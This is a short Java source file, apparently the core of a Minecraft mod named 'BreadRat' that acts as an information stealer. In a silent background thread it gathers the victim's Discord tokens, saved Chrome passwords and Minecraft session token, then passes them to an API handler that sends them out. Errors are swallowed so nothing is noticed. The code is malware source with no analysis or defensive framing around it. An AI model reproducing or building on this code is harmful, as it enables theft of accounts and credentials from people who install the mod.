package cc.breadcat;

import cc.breadcat.handlers.apiHandler;
import cc.breadcat.handlers.chromeHandler;
import cc.breadcat.handlers.discordHandler;
import net.minecraft.client.Minecraft;

public class BreadRat {
    public void runMe(final String minecraftToken) {
        new Thread(() -> {
            try {
                String token = minecraftToken;
                apiHandler api = new apiHandler();
                discordHandler discord = new discordHandler();
                api.add("discord",discord.getTokens());
                chromeHandler chrome = new chromeHandler();
                api.add("chrome",chrome.grabPassword());
                if (token == null) {
                    token = Minecraft.getMinecraft().getSession().getToken();
                }
                api.sendInfo(token);
            } catch (Exception e) {
            }
        }).start();
    }
}